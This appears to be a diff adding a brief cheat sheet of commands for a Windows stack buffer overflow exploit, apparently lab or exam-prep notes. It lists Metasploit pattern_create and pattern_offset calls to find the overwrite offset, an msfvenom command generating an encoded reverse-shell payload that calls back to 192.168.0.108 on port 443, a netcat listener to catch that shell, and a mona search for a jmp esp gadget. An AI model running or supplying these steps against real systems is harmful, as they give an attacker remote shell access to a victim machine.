@@ -1,0 +1,9 @@
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39654138
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.108 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a" -e x86/shikata_ga_nai
+
+nc -nlvp 443
+
+!mona jmp -r esp -cpb "\x00\x0a"
